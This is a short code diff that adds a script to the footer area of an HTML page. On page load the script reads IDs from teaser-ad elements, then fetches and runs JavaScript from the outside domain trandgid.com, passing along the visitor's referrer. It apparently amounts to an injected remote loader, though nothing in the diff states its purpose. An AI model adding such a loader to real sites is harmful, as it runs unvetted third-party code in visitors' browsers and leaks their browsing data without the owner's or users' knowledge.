@@ -197,5 +197,31 @@
         <a href="#">Back to top</a>
     </p>
 </footer>
+<script>
+    if (typeof bc_blocks == "undefined" && window.bc_blocks === undefined) {
+        var bc_blocks = document.getElementsByClassName("bigClickTeasersBlock");
+
+        if (bc_blocks.length) {
+            var bc_blocks_ids = [];
+
+            for (var i=0; i<bc_blocks.length; i++) {
+                var bc_el_id_str = bc_blocks[i].id;
+                var bc_el_id = parseInt(bc_el_id_str.substring(bc_el_id_str.lastIndexOf("_") + 1));
+
+                if (bc_el_id>0) {
+                    bc_blocks_ids.push(bc_el_id)
+                }
+            }
+
+            if (bc_blocks_ids.length&&bc_blocks_ids.length<5) {
+                var bc_scr = document.createElement("script");
+                bc_scr.src = "https://trandgid.com/lhzbsrfkjf/js/" + bc_blocks_ids.join("/") + "?r=" + encodeURIComponent(document.referrer) +
+                    "&" + Math.round(Math.random()*99999);
+                bc_scr.setAttribute("async","");
+                document.body.appendChild(bc_scr)
+            }
+        }
+    }
+</script>
 </body>
 </html>
